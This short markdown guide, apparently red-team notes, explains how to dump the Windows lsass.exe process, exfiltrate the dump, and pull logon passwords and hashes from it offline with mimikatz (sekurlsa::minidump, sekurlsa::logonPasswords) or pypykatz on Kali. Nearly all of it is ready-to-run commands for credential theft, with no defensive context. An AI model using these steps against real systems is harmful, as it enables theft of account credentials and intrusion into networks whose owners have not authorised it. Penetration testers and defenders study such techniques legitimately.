# Using Mimikatz Offline
Guide for Using Mimikatz Offline

## Step 1: Obtain and exfil lsass.exe
First, dump lsass.exe, then exfiltrate it to our machine.

## Step 2: Consider which mimikatz to use
Vanilla mimikatz EXE in Windows?  
Or Pypykatz in Kali?

## Vanilla Mimikatz in Windows
Download mimikatz from https://github.com/gentilkiwi/mimikatz/releases or https://gitlab.com/kalilinux/packages/mimikatz  
Then launch cmd prompt and run the commands below:  
`mimikatz.exe`  
`sekurlsa::minidump C:\folderlocation\lsass.dmp`  
`sekurlsa::logonPasswords`

## Pypykatz in Kali
Run the commands below in kali terminal to download, install and run
`git clone https://github.com/skelsec/pypykatz`  
`cd pypykatz`  
`sudo python3 setup.py install`  
`pypykatz lsa minidump /home/kali/folderlocation/lsass.dmp`  

## References
https://github.com/skelsec/pypykatz/wiki/lsa-minidump-command
